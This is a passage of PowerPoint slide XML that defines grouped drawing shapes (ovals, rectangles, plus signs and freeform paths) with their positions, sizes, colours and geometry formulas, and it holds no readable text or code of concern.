              <p:cNvSpPr>
                <a:spLocks noChangeAspect="1" noChangeArrowheads="1"/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="2007" y="2162"/>
                <a:ext cx="201" cy="142"/>
              </a:xfrm>
              <a:prstGeom prst="ellipse">
                <a:avLst/>
              </a:prstGeom>
              <a:solidFill>
                <a:srgbClr val="996633"/>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p>
                <a:pPr algn="ctr" eaLnBrk="0" hangingPunct="0"/>
                <a:endParaRPr lang="en-US" altLang="en-US" sz="900"/>
              </a:p>
            </p:txBody>
          </p:sp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="98421" name="Rectangle 129"/>
              <p:cNvSpPr>
                <a:spLocks noChangeAspect="1" noChangeArrowheads="1"/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="2159" y="1838"/>
                <a:ext cx="179" cy="11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tIns="18288" rIns="45720" bIns="18288" anchor="ctr"/>
              <a:lstStyle/>
              <a:p>
                <a:pPr algn="ctr" eaLnBrk="0" hangingPunct="0"/>
                <a:endParaRPr lang="en-US" altLang="en-US" sz="900"/>
              </a:p>
            </p:txBody>
          </p:sp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="98422" name="Rectangle 130"/>
              <p:cNvSpPr>
                <a:spLocks noChangeAspect="1" noChangeArrowheads="1"/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="1935" y="1838"/>
                <a:ext cx="170" cy="11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tIns="18288" rIns="45720" bIns="18288" anchor="ctr"/>
              <a:lstStyle/>
              <a:p>
                <a:pPr algn="ctr" eaLnBrk="0" hangingPunct="0"/>
                <a:endParaRPr lang="en-US" altLang="en-US" sz="900"/>
              </a:p>
            </p:txBody>
          </p:sp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="98423" name="Rectangle 131"/>
              <p:cNvSpPr>
                <a:spLocks noChangeAspect="1" noChangeArrowheads="1"/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm rot="10800000">
                <a:off x="1779" y="2176"/>
                <a:ext cx="180" cy="11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45720" tIns="18288" rIns="45720" bIns="18288" anchor="ctr"/>
              <a:lstStyle/>
              <a:p>
                <a:pPr algn="ctr" eaLnBrk="0" hangingPunct="0"/>
                <a:endParaRPr lang="en-US" altLang="en-US" sz="900"/>
              </a:p>
            </p:txBody>
          </p:sp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="98424" name="Rectangle 132"/>
              <p:cNvSpPr>
                <a:spLocks noChangeAspect="1" noChangeArrowheads="1"/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="1680" y="2064"/>
                <a:ext cx="777" cy="12"/>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25" name="Rectangle 133"/>
              <p:cNvSpPr>
                <a:spLocks noChangeAspect="1" noChangeArrowheads="1"/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="1775"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26" name="Rectangle 134"/>
              <p:cNvSpPr>
                <a:spLocks noChangeAspect="1" noChangeArrowheads="1"/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="1863"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27" name="Rectangle 135"/>
              <p:cNvSpPr>
                <a:spLocks noChangeAspect="1" noChangeArrowheads="1"/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm rot="10800000">
                <a:off x="2256" y="2176"/>
                <a:ext cx="180" cy="11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45720" tIns="18288" rIns="45720" bIns="18288" anchor="ctr"/>
              <a:lstStyle/>
              <a:p>
                <a:pPr algn="ctr" eaLnBrk="0" hangingPunct="0"/>
                <a:endParaRPr lang="en-US" altLang="en-US" sz="900"/>
              </a:p>
            </p:txBody>
          </p:sp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="98428" name="Oval 136"/>
              <p:cNvSpPr>
                <a:spLocks noChangeAspect="1" noChangeArrowheads="1"/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="1680" y="1824"/>
                <a:ext cx="201" cy="142"/>
              </a:xfrm>
              <a:prstGeom prst="ellipse">
                <a:avLst/>
              </a:prstGeom>
              <a:solidFill>
                <a:srgbClr val="996633"/>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p>
                <a:pPr algn="ctr" eaLnBrk="0" hangingPunct="0"/>
                <a:endParaRPr lang="en-US" altLang="en-US" sz="900"/>
              </a:p>
            </p:txBody>
          </p:sp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="98429" name="Rectangle 137"/>
              <p:cNvSpPr>
                <a:spLocks noChangeAspect="1" noChangeArrowheads="1"/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="2016"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30" name="Rectangle 138"/>
              <p:cNvSpPr>
                <a:spLocks noChangeAspect="1" noChangeArrowheads="1"/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="2243"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31" name="Rectangle 139"/>
              <p:cNvSpPr>
                <a:spLocks noChangeAspect="1" noChangeArrowheads="1"/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="2102"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32" name="Rectangle 140"/>
              <p:cNvSpPr>
                <a:spLocks noChangeAspect="1" noChangeArrowheads="1"/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="2340"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sp>
          <p:nvSpPr>
            <p:cNvPr id="98347" name="AutoShape 141"/>
            <p:cNvSpPr>
              <a:spLocks noChangeAspect="1" noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="1485" y="1778"/>
              <a:ext cx="104" cy="100"/>
            </a:xfrm>
            <a:prstGeom prst="plus">
              <a:avLst>
                <a:gd name="adj" fmla="val 25000"/>
              </a:avLst>
            </a:prstGeom>
            <a:solidFill>
              <a:srgbClr val="FF7C80"/>
            </a:solidFill>
            <a:ln w="6350">
              <a:solidFill>
                <a:schemeClr val="tx1"/>
              </a:solidFill>
              <a:miter lim="800000"/>
              <a:headEnd/>
              <a:tailEnd/>
            </a:ln>
          </p:spPr>
          <p:txBody>
            <a:bodyPr wrap="none" anchor="ctr"/>
            <a:lstStyle/>
            <a:p>
              <a:endParaRPr lang="zh-CN" altLang="zh-CN"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="98348" name="Rectangle 142"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="393" y="1482"/>
              <a:ext cx="91" cy="88"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:solidFill>
              <a:srgbClr val="FF9900"/>
            </a:solidFill>
            <a:ln w="6350">
              <a:solidFill>
                <a:schemeClr val="tx1"/>
              </a:solidFill>
              <a:miter lim="800000"/>
              <a:headEnd/>
              <a:tailEnd/>
            </a:ln>
          </p:spPr>
          <p:txBody>
            <a:bodyPr wrap="none" anchor="ctr"/>
            <a:lstStyle/>
            <a:p>
              <a:endParaRPr lang="zh-CN" altLang="zh-CN"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="98349" name="Rectangle 143"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="393" y="2223"/>
              <a:ext cx="91" cy="88"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:solidFill>
              <a:srgbClr val="FF9900"/>
            </a:solidFill>
            <a:ln w="6350">
              <a:solidFill>
                <a:schemeClr val="tx1"/>
              </a:solidFill>
              <a:miter lim="800000"/>
              <a:headEnd/>
              <a:tailEnd/>
            </a:ln>
          </p:spPr>
          <p:txBody>
            <a:bodyPr wrap="none" anchor="ctr"/>
            <a:lstStyle/>
            <a:p>
              <a:endParaRPr lang="zh-CN" altLang="zh-CN"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="98350" name="Rectangle 144"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="393" y="1802"/>
              <a:ext cx="91" cy="87"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:solidFill>
              <a:srgbClr val="FF9900"/>
            </a:solidFill>
            <a:ln w="6350">
              <a:solidFill>
                <a:schemeClr val="tx1"/>
              </a:solidFill>
              <a:miter lim="800000"/>
              <a:headEnd/>
              <a:tailEnd/>
            </a:ln>
          </p:spPr>
          <p:txBody>
            <a:bodyPr wrap="none" anchor="ctr"/>
            <a:lstStyle/>
            <a:p>
              <a:endParaRPr lang="zh-CN" altLang="zh-CN"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="98351" name="Rectangle 145"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="393" y="899"/>
              <a:ext cx="91" cy="88"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:solidFill>
              <a:srgbClr val="FF9900"/>
            </a:solidFill>
            <a:ln w="6350">
              <a:solidFill>
                <a:schemeClr val="tx1"/>
              </a:solidFill>
              <a:miter lim="800000"/>
              <a:headEnd/>
              <a:tailEnd/>
            </a:ln>
          </p:spPr>
          <p:txBody>
            <a:bodyPr wrap="none" anchor="ctr"/>
            <a:lstStyle/>
            <a:p>
              <a:endParaRPr lang="zh-CN" altLang="zh-CN"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:grpSp>
          <p:nvGrpSpPr>
            <p:cNvPr id="98352" name="Group 146"/>
            <p:cNvGrpSpPr>
              <a:grpSpLocks noChangeAspect="1"/>
            </p:cNvGrpSpPr>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr bwMode="auto">
            <a:xfrm>
              <a:off x="609" y="2236"/>
              <a:ext cx="760" cy="447"/>
              <a:chOff x="1680" y="1824"/>
              <a:chExt cx="777" cy="480"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="98407" name="Oval 147"/>
              <p:cNvSpPr>
                <a:spLocks noChangeAspect="1" noChangeArrowheads="1"/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="2007" y="2162"/>
                <a:ext cx="201" cy="142"/>
              </a:xfrm>
              <a:prstGeom prst="ellipse">
                <a:avLst/>
              </a:prstGeom>
              <a:solidFill>
                <a:srgbClr val="996633"/>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p>
                <a:pPr algn="ctr" eaLnBrk="0" hangingPunct="0"/>
                <a:endParaRPr lang="en-US" altLang="en-US" sz="900"/>
              </a:p>
            </p:txBody>
          </p:sp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="98408" name="Rectangle 148"/>
              <p:cNvSpPr>
                <a:spLocks noChangeAspect="1" noChangeArrowheads="1"/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="2159" y="1838"/>
                <a:ext cx="179" cy="11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tIns="18288" rIns="45720" bIns="18288" anchor="ctr"/>
              <a:lstStyle/>
              <a:p>
                <a:pPr algn="ctr" eaLnBrk="0" hangingPunct="0"/>
                <a:endParaRPr lang="en-US" altLang="en-US" sz="900"/>
              </a:p>
            </p:txBody>
          </p:sp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="98409" name="Rectangle 149"/>
              <p:cNvSpPr>
                <a:spLocks noChangeAspect="1" noChangeArrowheads="1"/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="1935" y="1838"/>
                <a:ext cx="170" cy="11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tIns="18288" rIns="45720" bIns="18288" anchor="ctr"/>
              <a:lstStyle/>
              <a:p>
                <a:pPr algn="ctr" eaLnBrk="0" hangingPunct="0"/>
                <a:endParaRPr lang="en-US" altLang="en-US" sz="900"/>
              </a:p>
            </p:txBody>
          </p:sp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="98410" name="Rectangle 150"/>
              <p:cNvSpPr>
                <a:spLocks noChangeAspect="1" noChangeArrowheads="1"/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm rot="10800000">
                <a:off x="1779" y="2176"/>
                <a:ext cx="180" cy="11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45720" tIns="18288" rIns="45720" bIns="18288" anchor="ctr"/>
              <a:lstStyle/>
              <a:p>
                <a:pPr algn="ctr" eaLnBrk="0" hangingPunct="0"/>
                <a:endParaRPr lang="en-US" altLang="en-US" sz="900"/>
              </a:p>
            </p:txBody>
          </p:sp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="98411" name="Rectangle 151"/>
              <p:cNvSpPr>
                <a:spLocks noChangeAspect="1" noChangeArrowheads="1"/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="1680" y="2064"/>
                <a:ext cx="777" cy="12"/>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12" name="Rectangle 152"/>
              <p:cNvSpPr>
                <a:spLocks noChangeAspect="1" noChangeArrowheads="1"/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="1775"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13" name="Rectangle 153"/>
              <p:cNvSpPr>
                <a:spLocks noChangeAspect="1" noChangeArrowheads="1"/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="1863"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14" name="Rectangle 154"/>
              <p:cNvSpPr>
                <a:spLocks noChangeAspect="1" noChangeArrowheads="1"/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm rot="10800000">
                <a:off x="2256" y="2176"/>
                <a:ext cx="180" cy="11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45720" tIns="18288" rIns="45720" bIns="18288" anchor="ctr"/>
              <a:lstStyle/>
              <a:p>
                <a:pPr algn="ctr" eaLnBrk="0" hangingPunct="0"/>
                <a:endParaRPr lang="en-US" altLang="en-US" sz="900"/>
              </a:p>
            </p:txBody>
          </p:sp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="98415" name="Oval 155"/>
              <p:cNvSpPr>
                <a:spLocks noChangeAspect="1" noChangeArrowheads="1"/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="1680" y="1824"/>
                <a:ext cx="201" cy="142"/>
              </a:xfrm>
              <a:prstGeom prst="ellipse">
                <a:avLst/>
              </a:prstGeom>
              <a:solidFill>
                <a:srgbClr val="996633"/>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p>
                <a:pPr algn="ctr" eaLnBrk="0" hangingPunct="0"/>
                <a:endParaRPr lang="en-US" altLang="en-US" sz="900"/>
              </a:p>
            </p:txBody>
          </p:sp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="98416" name="Rectangle 156"/>
              <p:cNvSpPr>
                <a:spLocks noChangeAspect="1" noChangeArrowheads="1"/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="2016"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17" name="Rectangle 157"/>
              <p:cNvSpPr>
                <a:spLocks noChangeAspect="1" noChangeArrowheads="1"/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="2243"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18" name="Rectangle 158"/>
              <p:cNvSpPr>
                <a:spLocks noChangeAspect="1" noChangeArrowheads="1"/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="2102"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19" name="Rectangle 159"/>
              <p:cNvSpPr>
                <a:spLocks noChangeAspect="1" noChangeArrowheads="1"/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="2340"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sp>
          <p:nvSpPr>
            <p:cNvPr id="98353" name="AutoShape 160"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="2287" y="1794"/>
              <a:ext cx="91" cy="81"/>
            </a:xfrm>
            <a:prstGeom prst="plus">
              <a:avLst>
                <a:gd name="adj" fmla="val 25000"/>
              </a:avLst>
            </a:prstGeom>
            <a:solidFill>
              <a:srgbClr val="CCFFCC"/>
            </a:solidFill>
            <a:ln w="6350">
              <a:solidFill>
                <a:schemeClr val="tx1"/>
              </a:solidFill>
              <a:miter lim="800000"/>
              <a:headEnd/>
              <a:tailEnd/>
            </a:ln>
          </p:spPr>
          <p:txBody>
            <a:bodyPr wrap="none" anchor="ctr"/>
            <a:lstStyle/>
            <a:p>
              <a:endParaRPr lang="zh-CN" altLang="zh-CN"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="98354" name="Freeform 161"/>
            <p:cNvSpPr>
              <a:spLocks/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="3121" y="2274"/>
              <a:ext cx="609" cy="399"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="T0" fmla="*/ 0 w 717"/>
                <a:gd name="T1" fmla="*/ 49 h 419"/>
                <a:gd name="T2" fmla="*/ 3 w 717"/>
                <a:gd name="T3" fmla="*/ 49 h 419"/>
                <a:gd name="T4" fmla="*/ 3 w 717"/>
                <a:gd name="T5" fmla="*/ 0 h 419"/>
                <a:gd name="T6" fmla="*/ 8 w 717"/>
                <a:gd name="T7" fmla="*/ 0 h 419"/>
                <a:gd name="T8" fmla="*/ 8 w 717"/>
                <a:gd name="T9" fmla="*/ 112 h 419"/>
                <a:gd name="T10" fmla="*/ 3 w 717"/>
                <a:gd name="T11" fmla="*/ 112 h 419"/>
                <a:gd name="T12" fmla="*/ 0 60000 65536"/>
                <a:gd name="T13" fmla="*/ 0 60000 65536"/>
                <a:gd name="T14" fmla="*/ 0 60000 65536"/>
                <a:gd name="T15" fmla="*/ 0 60000 65536"/>
                <a:gd name="T16" fmla="*/ 0 60000 65536"/>
                <a:gd name="T17" fmla="*/ 0 60000 65536"/>
                <a:gd name="T18" fmla="*/ 0 w 717"/>
                <a:gd name="T19" fmla="*/ 0 h 419"/>
                <a:gd name="T20" fmla="*/ 717 w 717"/>
                <a:gd name="T21" fmla="*/ 419 h 419"/>
              </a:gdLst>
              <a:ahLst/>
              <a:cxnLst>
                <a:cxn ang="T12">
                  <a:pos x="T0" y="T1"/>
                </a:cxn>
                <a:cxn ang="T13">
                  <a:pos x="T2" y="T3"/>
                </a:cxn>
                <a:cxn ang="T14">
                  <a:pos x="T4" y="T5"/>
                </a:cxn>
                <a:cxn ang="T15">
                  <a:pos x="T6" y="T7"/>
                </a:cxn>
                <a:cxn ang="T16">
                  <a:pos x="T8" y="T9"/>
                </a:cxn>
                <a:cxn ang="T17">
                  <a:pos x="T10" y="T11"/>
                </a:cxn>
              </a:cxnLst>
              <a:rect l="T18" t="T19" r="T20" b="T21"/>
              <a:pathLst>
                <a:path w="717" h="419">
                  <a:moveTo>
                    <a:pt x="0" y="184"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="241" y="184"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="241" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="717" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="717" y="419"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="101" y="419"/>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55" name="AutoShape 162"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="3234" y="2636"/>
              <a:ext cx="82" cy="73"/>
            </a:xfrm>
            <a:prstGeom prst="plus">
              <a:avLst>
                <a:gd name="adj" fmla="val 25000"/>
              </a:avLst>
            </a:prstGeom>
            <a:solidFill>
              <a:schemeClr val="accent1"/>
            </a:solidFill>
            <a:ln w="6350">
              <a:solidFill>
                <a:schemeClr val="tx1"/>
              </a:solidFill>
              <a:miter lim="800000"/>
              <a:headEnd/>
              <a:tailEnd/>
            </a:ln>
          </p:spPr>
          <p:txBody>
            <a:bodyPr wrap="none" anchor="ctr"/>
            <a:lstStyle/>
            <a:p>
              <a:endParaRPr lang="zh-CN" altLang="zh-CN"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="98356" name="Freeform 163"/>
            <p:cNvSpPr>
              <a:spLocks/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="1533" y="1277"/>
              <a:ext cx="2134" cy="254"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="T0" fmla="*/ 0 w 2134"/>
                <a:gd name="T1" fmla="*/ 69 h 267"/>
                <a:gd name="T2" fmla="*/ 1791 w 2134"/>
                <a:gd name="T3" fmla="*/ 69 h 267"/>
                <a:gd name="T4" fmla="*/ 1791 w 2134"/>
                <a:gd name="T5" fmla="*/ 0 h 267"/>
                <a:gd name="T6" fmla="*/ 2134 w 2134"/>
                <a:gd name="T7" fmla="*/ 0 h 267"/>
                <a:gd name="T8" fmla="*/ 0 60000 65536"/>
                <a:gd name="T9" fmla="*/ 0 60000 65536"/>
                <a:gd name="T10" fmla="*/ 0 60000 65536"/>
                <a:gd name="T11" fmla="*/ 0 60000 65536"/>
                <a:gd name="T12" fmla="*/ 0 w 2134"/>
                <a:gd name="T13" fmla="*/ 0 h 267"/>
                <a:gd name="T14" fmla="*/ 2134 w 2134"/>
                <a:gd name="T15" fmla="*/ 267 h 267"/>
              </a:gdLst>
              <a:ahLst/>
              <a:cxnLst>
                <a:cxn ang="T8">
                  <a:pos x="T0" y="T1"/>
                </a:cxn>
                <a:cxn ang="T9">
                  <a:pos x="T2" y="T3"/>
                </a:cxn>
                <a:cxn ang="T10">
                  <a:pos x="T4" y="T5"/>
                </a:cxn>
                <a:cxn ang="T11">
                  <a:pos x="T6" y="T7"/>
                </a:cxn>
              </a:cxnLst>
              <a:rect l="T12" t="T13" r="T14" b="T15"/>
              <a:pathLst>
                <a:path w="2134" h="267">
                  <a:moveTo>
                    <a:pt x="0" y="267"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="1791" y="267"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1791" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2134" y="0"/>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57" name="Freeform 164"/>
            <p:cNvSpPr>
              <a:spLocks/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="1540" y="1773"/>
              <a:ext cx="2190" cy="524"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="T0" fmla="*/ 0 w 2190"/>
                <a:gd name="T1" fmla="*/ 136 h 552"/>
                <a:gd name="T2" fmla="*/ 330 w 2190"/>
                <a:gd name="T3" fmla="*/ 136 h 552"/>
                <a:gd name="T4" fmla="*/ 330 w 2190"/>
                <a:gd name="T5" fmla="*/ 94 h 552"/>
                <a:gd name="T6" fmla="*/ 1790 w 2190"/>
                <a:gd name="T7" fmla="*/ 94 h 552"/>
                <a:gd name="T8" fmla="*/ 1790 w 2190"/>
                <a:gd name="T9" fmla="*/ 0 h 552"/>
                <a:gd name="T10" fmla="*/ 2190 w 2190"/>
                <a:gd name="T11" fmla="*/ 0 h 552"/>
                <a:gd name="T12" fmla="*/ 0 60000 65536"/>
                <a:gd name="T13" fmla="*/ 0 60000 65536"/>
                <a:gd name="T14" fmla="*/ 0 60000 65536"/>
                <a:gd name="T15" fmla="*/ 0 60000 65536"/>
                <a:gd name="T16" fmla="*/ 0 60000 65536"/>
                <a:gd name="T17" fmla="*/ 0 60000 65536"/>
                <a:gd name="T18" fmla="*/ 0 w 2190"/>
                <a:gd name="T19" fmla="*/ 0 h 552"/>
                <a:gd name="T20" fmla="*/ 2190 w 2190"/>
                <a:gd name="T21" fmla="*/ 552 h 552"/>
              </a:gdLst>
              <a:ahLst/>
              <a:cxnLst>
                <a:cxn ang="T12">
                  <a:pos x="T0" y="T1"/>
                </a:cxn>
                <a:cxn ang="T13">
                  <a:pos x="T2" y="T3"/>
                </a:cxn>
                <a:cxn ang="T14">
                  <a:pos x="T4" y="T5"/>
                </a:cxn>
                <a:cxn ang="T15">
                  <a:pos x="T6" y="T7"/>
                </a:cxn>
                <a:cxn ang="T16">
                  <a:pos x="T8" y="T9"/>
                </a:cxn>
                <a:cxn ang="T17">
                  <a:pos x="T10" y="T11"/>
                </a:cxn>
              </a:cxnLst>
              <a:rect l="T18" t="T19" r="T20" b="T21"/>
              <a:pathLst>
                <a:path w="2190" h="552">
                  <a:moveTo>
                    <a:pt x="0" y="552"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="330" y="552"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="330" y="381"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1790" y="381"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1790" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2190" y="0"/>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58" name="Freeform 165"/>
            <p:cNvSpPr>
              <a:spLocks/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="3561" y="698"/>
              <a:ext cx="1668" cy="763"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="T0" fmla="*/ 3017202 w 1250"/>
                <a:gd name="T1" fmla="*/ 63681 h 628"/>
                <a:gd name="T2" fmla="*/ 2901174 w 1250"/>
                <a:gd name="T3" fmla="*/ 30220 h 628"/>
                <a:gd name="T4" fmla="*/ 2971602 w 1250"/>
                <a:gd name="T5" fmla="*/ 24253 h 628"/>
                <a:gd name="T6" fmla="*/ 2664667 w 1250"/>
                <a:gd name="T7" fmla="*/ 0 h 628"/>
                <a:gd name="T8" fmla="*/ 2533821 w 1250"/>
                <a:gd name="T9" fmla="*/ 10169 h 628"/>
                <a:gd name="T10" fmla="*/ 2463633 w 1250"/>
                <a:gd name="T11" fmla="*/ 626 h 628"/>
                <a:gd name="T12" fmla="*/ 2333457 w 1250"/>
                <a:gd name="T13" fmla="*/ 6489 h 628"/>
                <a:gd name="T14" fmla="*/ 2192478 w 1250"/>
                <a:gd name="T15" fmla="*/ 0 h 628"/>
                <a:gd name="T16" fmla="*/ 1774510 w 1250"/>
                <a:gd name="T17" fmla="*/ 9779 h 628"/>
                <a:gd name="T18" fmla="*/ 1412545 w 1250"/>
                <a:gd name="T19" fmla="*/ 3618 h 628"/>
                <a:gd name="T20" fmla="*/ 1218728 w 1250"/>
                <a:gd name="T21" fmla="*/ 12525 h 628"/>
                <a:gd name="T22" fmla="*/ 947596 w 1250"/>
                <a:gd name="T23" fmla="*/ 0 h 628"/>
                <a:gd name="T24" fmla="*/ 519929 w 1250"/>
                <a:gd name="T25" fmla="*/ 8887 h 628"/>
                <a:gd name="T26" fmla="*/ 409411 w 1250"/>
                <a:gd name="T27" fmla="*/ 0 h 628"/>
                <a:gd name="T28" fmla="*/ 318920 w 1250"/>
                <a:gd name="T29" fmla="*/ 7133 h 628"/>
                <a:gd name="T30" fmla="*/ 218277 w 1250"/>
                <a:gd name="T31" fmla="*/ 2413 h 628"/>
                <a:gd name="T32" fmla="*/ 0 w 1250"/>
                <a:gd name="T33" fmla="*/ 32287 h 628"/>
                <a:gd name="T34" fmla="*/ 48319 w 1250"/>
                <a:gd name="T35" fmla="*/ 41146 h 628"/>
                <a:gd name="T36" fmla="*/ 139281 w 1250"/>
